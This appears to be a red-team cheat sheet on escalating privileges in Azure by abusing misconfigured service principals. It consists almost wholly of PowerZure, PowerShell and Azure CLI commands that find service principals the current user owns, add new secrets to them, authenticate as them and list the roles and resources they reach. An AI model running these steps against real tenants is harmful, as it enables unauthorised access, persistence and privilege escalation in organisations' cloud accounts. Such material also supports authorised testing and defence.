# Misconfigured Service Principals Privesc

### Tools: Powerzure

## Steps:

#### 1) Import Powerzure module

    Import-Module Powerzure.ps1 

#### 2) Verify whether the current user is assigned as the owner of a service principal

    Get-AzureAppOwner 

#### 3) Add a new secret to APP_NAME to allow us to authenticate with the app

    Add-AzureSPSecret -ApplicationName APP_NAME -Password PASSWORD 

    $Credential = Get-Credential

    Connect-AzAccount -Credential $Credential -Tenant TENANT_ID -ServicePrincipal (Windows Powershell)

## OR

    az login --service-principal --username APP_ID --password PASSWORD --tenant TENANT_ID (Azure CLI)

## NOTE: Don't forget to make a note of the APP_ID to authenticate as the service principal!

#### 4) Verify the role assignment and scope of the service principal

    az role assignment list --assignee APP_ID --include-groups --include-inherited --query '[].{username:principalName, role:roleDefinitionName, usertype:principalType, scope:scope}' 

# Add credentials to enterprise applications

To add credentials (application passwords) to enterprise applications in Azure, follow these steps and commands:

### 1) Check if Secrets can be added

    . .\Add-AzADAppSecret.ps1
    Add-AzADAppSecret -GraphToken $graphtoken -Verbose

### 2) Use the Secret to authenticate as Service Principal

    $password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)

    Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>

### 3) Check what resources Service Principal can access

    Get-AzResource

    
